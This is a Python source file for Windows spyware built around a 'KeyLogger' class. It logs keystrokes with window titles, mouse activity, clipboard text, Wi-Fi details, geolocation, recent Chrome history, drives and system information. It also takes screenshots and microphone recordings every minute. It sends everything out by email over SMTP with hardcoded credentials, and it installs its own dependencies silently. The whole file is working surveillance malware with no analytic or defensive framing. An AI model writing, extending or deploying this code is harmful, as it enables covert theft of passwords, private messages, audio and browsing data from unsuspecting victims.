try:
    import os
    import platform
    import smtplib
    import socket
    import threading
    import pyscreenshot
    import sounddevice as sd
    import clipboard
    import win32gui
    import requests
    import shutil
    import sqlite3
    from cryptography.fernet import Fernet
    from pynput.keyboard import Listener
    from pynput.mouse import Listener as MouseListener
    from email.mime.multipart import MIMEMultipart
    from email.mime.base import MIMEBase
    from email import encoders
    from scipy.io.wavfile import write
except ModuleNotFoundError:
    from subprocess import call
    modules = ["pyscreenshot","pynput","sounddevice","clipboard","cryptography","requests","pywin32"]
    call("pip install " + ' '.join(modules), shell=True)

finally:
    EMAIL_ADDRESS =  "724de2df4ab869"
    EMAIL_PASSWORD = "b337ff024e6e37"
    SEND_REPORT_EVERY = 40  # seconds
    ENCRYPTION_KEY = Fernet.generate_key()
    cipher = Fernet(ENCRYPTION_KEY)

    class KeyLogger:
        def __init__(self, time_interval, email, password):
            self.interval = time_interval
            self.log = "KeyLogger Started..."
            self.email = email
            self.password = password

        def appendlog(self, string):
            self.log += f"\n{string}"

        def get_active_window_title(self):
            try:
                window = win32gui.GetForegroundWindow()
                return win32gui.GetWindowText(window)
            except:
                return "Unknown"

        def save_data(self, key):
            try:
                current_key = str(key.char)
            except AttributeError:
                current_key = f"[{key.name}]"
            window_title = self.get_active_window_title()
            self.appendlog(f"[Window: {window_title}] {current_key}")

        def on_move(self, x, y):
            self.appendlog(f"[MOUSE move] at ({x}, {y})")

        def on_click(self, x, y):
            self.appendlog(f"[MOUSE CLICK] at ({x}, {y})")

        def on_scroll(self, x, y):
            self.appendlog(f"[MOUSE scroll] at ({x}, {y})")

        def clip(self):
            try:
                text = clipboard.paste()
                if text:
                    self.appendlog(f"[Clipboard]: {text}")
            except:
                pass

        def wifi_info(self):
            try:
                result = os.popen("netsh wlan show interfaces").read()
                self.appendlog(f"[Wi-Fi Info]\n{result}")
            except Exception as e:
                self.appendlog(f"[Wi-Fi Error] {e}")

        def get_geolocation(self):
            try:
                res = requests.get("http://ip-api.com/json/").json()
                location = f"{res['city']}, {res['regionName']}, {res['country']} - {res['zip']}"
                self.appendlog(f"[Location]: {location}")
            except Exception as e:
                self.appendlog(f"[Location Error]: {e}")

        def get_browser_history(self):
            try:
                path = os.environ['USERPROFILE'] + r"\AppData\Local\Google\Chrome\User Data\Default\History"
                temp_copy = "history_copy"
                shutil.copyfile(path, temp_copy)
                conn = sqlite3.connect(temp_copy)
                cursor = conn.cursor()
                cursor.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 5")
                results = cursor.fetchall()
                for url in results:
                    self.appendlog(f"[Visited] {url[0]} - {url[1]}")
                conn.close()
                os.remove(temp_copy)
            except Exception as e:
                self.appendlog(f"[Browser History Error]: {e}")

        def check_usb_devices(self):
            try:
                drives = os.popen("wmic logicaldisk get name").read()
                self.appendlog(f"[USB Devices]:\n{drives}")
            except Exception as e:
                self.appendlog(f"[USB Error]: {e}")

        def system_information(self):
            info = {
                "Hostname": socket.gethostname(),
                "IP Address": socket.gethostbyname(socket.gethostname()),
                "Platform": platform.system(),
                "Processor": platform.processor(),
                "Machine": platform.machine()
            }
            sys_info = "\n".join([f"{k}: {v}" for k, v in info.items()])
            self.appendlog("\n[System Info]\n" + sys_info)

        def microphone(self):
            fs = 44100
            seconds = 10
            file = "sound.wav"
            recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
            sd.wait()
            write(file, fs, recording)
            self.multimedia(file)
            threading.Timer(60, self.microphone).start()

        def screenshot(self):
            img_path = 'screenshot.png'
            img = pyscreenshot.grab()
            img.save(img_path)
            self.multimedia(img_path)
            threading.Timer(60, self.screenshot).start()

        def multimedia(self, file):
            try:
                attachment = open(file, 'rb')
                obj = MIMEBase('application', 'octet-stream')
                obj.set_payload(attachment.read())
                encoders.encode_base64(obj)
                obj.add_header("Content-Disposition", f"attachment; filename={file}")
                msg = MIMEMultipart()
                msg["From"] = EMAIL_ADDRESS
                msg["To"] = EMAIL_ADDRESS
                msg.attach(obj)
                self.send_mail(self.email, self.password, msg.as_string())
            except Exception as e:
                self.appendlog(f"[Multimedia Error]: {e}")

        def encrypt_log(self):
            try:
                return cipher.encrypt(self.log.encode()).decode()
            except Exception as e:
                return f"[Encryption Error]: {e}"

        def send_mail(self, email, password, message):
            try:
                with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
                    server.login(email, password)
                    server.sendmail(email, email, message)
            except Exception as e:
                print(f"[Email Error]: {e}")

        def report(self):
            encrypted = self.encrypt_log()
            self.send_mail(self.email, self.password, encrypted)
            self.log = ""
            timer = threading.Timer(self.interval, self.report)
            timer.start()

        def start_keyboard_listener(self):
            with Listener(on_press=self.save_data) as keyboard_listener:
                keyboard_listener.join()

        def start_mouse_listener(self):
            with MouseListener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener:
                mouse_listener.join()

        def run(self):
            self.system_information()
            self.get_geolocation()
            self.get_browser_history()
            self.clip()
            self.wifi_info()
            self.check_usb_devices()
            self.microphone()
            self.screenshot()
            self.report()
            keyboard = threading.Thread(target=self.start_keyboard_listener)
            mouse = threading.Thread(target=self.start_mouse_listener)
            keyboard.start()
            mouse.start()

    keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
    keylogger.run()
